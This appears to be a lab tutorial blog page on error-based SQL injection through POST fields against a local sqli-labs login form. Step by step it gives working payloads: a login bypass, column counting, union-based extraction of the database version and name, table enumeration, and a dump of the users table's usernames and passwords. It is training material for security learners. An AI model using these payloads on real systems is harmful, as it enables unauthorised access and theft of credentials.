---
type: page
title: "SQL Injection Lab – Lesson 5 (POST parameter injection -error based)"

draft: false
tags: ["SQL Injection", "Double Query Injection", "Web Security", "Labs"]
categories: ["Learning", "Web Security", "SQLi"]
# Add these lines to hide from lists:
_build:
  list: never
  render: true
---
type: page

## POST parameter injection -error based

POST-parameter error-based injection is when malicious input in an HTTP POST field deliberately triggers a database/application error that leaks internal info (SQL fragments, column/ table names, DB type/version) in responses or logs.


# Inject parameter
So this is our test lab: ***http://localhost:8080/sqli-labs/sqli-labs-master/Less-12/***.

Now you see we have the login page with the input fields of ***Username*** and ***Password***.

# Testing queries
## Now let's try the simple login which is "***admin***, ***admin***".

![Alt text](/sqli-05/ss1.jpg)

- Boom as you can see we got logged in as ***admin***.

## Now try something else to break the query. 

- Now we are trying ***'*** to check if it's pass or not. 

![Alt text](/sqli-05/ss2.jpg)

- It's seems like ***'*** this got bypass.

##  Now let's try ***"*** to see if this break the querry or not.

![Alt text](/sqli-05/ss3.jpg)

- Here you go as we can see our query got broke we got an error.

## Fixing this query.

- Here's the key point we are using ***#*** in this lab because ***#*** is simple and reliable; -- requires a space after it (in URLs --+ is used because + decodes to a space), so # often works better in labs.

Now try to fix the query with this payload ") # .
![Alt text](/sqli-05/ss4.jpg)

As you can see our payload is working.

## Now let's try something more cool to dump from the database. 

We are trying thi Payload: 

") or 1=1 # 

to see if its true or false.

- If this works it's mean we can execute more queries and will be able to dump. 

![Alt text](/sqli-05/ss5.jpg)

Now as we can see we got logged in with the username ***Dumb*** and password ***Dumb***.

## Now its time to check the columns by using order by .

Payload: 

") order by 1 # 

![Alt text](/sqli-05/ss6.jpg)

- This is working, it's mean we have column no 1

***Lets try more*** 

Payload: 

") order by 2 # 

![Alt text](/sqli-05/ss7.jpg)

- This is also working mean we got column no 2

Payload: 

") order by 3 # 

![Alt text](/sqli-05/ss8.jpg)

- Now as you can see we get an error, it's mean we only have 2 columns.

## Now alterate it more.

I used this payload:    

") union select 1,2 #   

![Alt text](/sqli-05/ss9.jpg)

- And you can see we got the same ***1 2*** on username and password.

# Now try to get Database name and version

For this we will use this payload:  

 ") union select version(),database() #

![Alt text](/sqli-05/ss10.jpg)

- As you can see the ***mysql Version*** and the ***Name of the Database*** on your screen. 

## Let's enumerate it further

We are going to use this payload:

") union select 1, table_name from information_schema.tables where table_schema='security' #

![Alt text](/sqli-05/ss11.jpg)

- And now we got our first table name.

# And we can use LIMIT function to enumerate more.

Payload:

") union select 1, table_name from information_schema.tables where table_schema='security' LIMIT 1,1 #

![Alt text](/sqli-05/ss12.jpg)

- We got refers.

Payload:

") union select 1, table_name from information_schema.tables where table_schema='security' LIMIT 2,1 #

![Alt text](/sqli-05/ss13.jpg)

- We got uagents.

Payload:

") union select 1, table_name from information_schema.tables where table_schema='security' LIMIT 3,1 #

![Alt text](/sqli-05/ss14.jpg)

- We got users.

Payload:

") union select 1, table_name from information_schema.tables where table_schema='security' LIMIT 4,1 #

![Alt text](/sqli-05/ss15.jpg)

- We got nothing, so it's mean we got 3 tables.


## And now you can enumerate it more to dump more.

1. Basic Database Structure Dump:

") union select 1,(SELECT GROUP_CONCAT(table_name, ':', column_name) FROM information_schema.columns WHERE table_schema=database()) #

![Alt text](/sqli-05/dios1.jpg)

2. Table Names Only:

") union select 1,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()) #

![Alt text](/sqli-05/dios2.jpg)

3. ***Users*** Table Data Dump:

") union select 1,(SELECT GROUP_CONCAT(username, ':', password) FROM users) #

![Alt text](/sqli-05/dios3.jpg)

4. Complete Database Info:

") union select 1,CONCAT('DB:',database(),' | User:',user(),' | Tables:',(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())) #

![Alt text](/sqli-05/dios4.jpg)
